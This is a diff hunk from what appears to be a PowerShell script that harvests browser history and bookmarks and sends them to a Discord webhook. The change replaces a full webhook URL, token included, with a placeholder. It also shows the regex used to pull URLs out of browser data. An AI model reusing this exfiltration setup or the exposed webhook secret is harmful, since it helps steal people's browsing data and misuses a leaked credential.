@@ -9,7 +9,7 @@ USAGE
 
 #>
 
-$hookurl = "https://discord.com/api/webhooks/1176132406642757662/xCdVqng2X6cErTeiXkd8SO8tiu7oPJ9mOAUdDO9kcCHbM4xZGL6HUopf_adRv7DLeQQE"
+$hookurl = "YOUR_WEBHOOK_HERE"
 
 # Define the Regular expression for extracting history and bookmarks
 $Expression = '(http|https)://([\w-]+\.)+[\w-]+(/[\w- ./?%&=]*)*?'
